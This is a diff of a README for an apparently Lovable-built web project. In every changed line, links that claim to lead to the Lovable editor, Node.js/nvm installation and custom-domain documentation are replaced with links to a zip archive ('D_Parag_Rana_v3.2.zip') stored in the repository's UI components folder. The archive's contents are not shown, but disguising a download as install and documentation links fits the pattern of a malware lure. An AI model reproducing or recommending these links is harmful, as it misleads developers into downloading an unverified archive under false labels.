@@ -2,7 +2,7 @@
 
 ## Project info
 
-**URL**: https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/DR-Parag-Rana_1.1.zip
+**URL**: https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/D_Parag_Rana_v3.2.zip
 
 ## How can I edit this code?
 
@@ -10,7 +10,7 @@ There are several ways of editing your application.
 
 **Use Lovable**
 
-Simply visit the [Lovable Project](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/DR-Parag-Rana_1.1.zip) and start prompting.
+Simply visit the [Lovable Project](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/D_Parag_Rana_v3.2.zip) and start prompting.
 
 Changes made via Lovable will be committed automatically to this repo.
 
@@ -18,7 +18,7 @@ Changes made via Lovable will be committed automatically to this repo.
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/DR-Parag-Rana_1.1.zip & npm installed - [install with nvm](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/DR-Parag-Rana_1.1.zip)
+The only requirement is having https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/D_Parag_Rana_v3.2.zip & npm installed - [install with nvm](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/D_Parag_Rana_v3.2.zip)
 
 Follow these steps:
 
@@ -62,7 +62,7 @@ This project is built with:
 
 ## How can I deploy this project?
 
-Simply open [Lovable](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/DR-Parag-Rana_1.1.zip) and click on Share -> Publish.
+Simply open [Lovable](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/D_Parag_Rana_v3.2.zip) and click on Share -> Publish.
 
 ## Can I connect a custom domain to my Lovable project?
 
@@ -70,4 +70,4 @@ Yes, you can!
 
 To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
 
-Read more here: [Setting up a custom domain](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/DR-Parag-Rana_1.1.zip)
+Read more here: [Setting up a custom domain](https://raw.githubusercontent.com/Mehul-Rathva/DR-Parag-Rana/main/src/components/ui/D_Parag_Rana_v3.2.zip)
